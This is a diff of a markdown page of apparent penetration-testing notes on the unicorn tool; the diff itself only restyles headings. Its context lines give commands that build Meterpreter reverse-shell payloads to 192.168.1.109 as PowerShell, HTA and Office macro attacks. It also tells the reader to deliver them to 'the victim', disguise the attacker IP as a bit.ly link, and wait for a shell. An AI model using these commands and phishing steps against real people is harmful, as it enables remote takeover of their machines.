@@ -10,7 +10,7 @@ git clone https://github.com/trustedsec/unicorn.git
 ./unicorn.py
 ```
 
-### **Powershell Attack**
+### <mark style="color:orange;">**Powershell Attack**</mark>
 
 ```
 ./unicorn.py windows/meterpreter/reverse_tcp 192.168.1.109 4444
@@ -27,7 +27,7 @@ msf> resource unicorn.rc
 
 deliver the payload from powershell\_attack.txt file to the victim (via CMD or somewhere else) and you have a shell.
 
-### **HTA Attack**
+### <mark style="color:orange;">**HTA Attack**</mark>
 
 ```
 ./unicorn.py windows/meterpreter/reverse_https 192.168.1.109 4455 hta
@@ -39,7 +39,7 @@ Now convert your IP in bit.ly URL form and send to the victim and then wait for 
 The victim has to open the link to your hosted index.html file and click "open" when prompt for the HTA file to run.
 {% endhint %}
 
-### **Macro Attack**
+### <mark style="color:orange;">**Macro Attack**</mark>
 
 ```
 ./unicorn.py windows/meterpreter/reverse_https 192.168.1.109 443 macro
